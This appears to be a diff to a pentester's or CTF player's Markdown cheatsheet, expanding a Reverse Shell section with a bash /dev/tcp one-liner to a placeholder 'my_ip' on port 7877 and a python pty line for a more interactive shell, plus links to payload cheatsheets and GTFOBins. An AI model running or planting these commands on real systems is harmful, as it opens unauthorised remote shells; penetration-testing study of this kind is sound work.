@@ -18,7 +18,10 @@
 #### Reverse Shell
 - https://reverse-shell.sh/
 - [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
+- Bash tcp
+    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
+- Make it moreinteractively
+    - `python -c 'import pty; pty.spawn("/bin/bash")'``
 ## Privilege
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
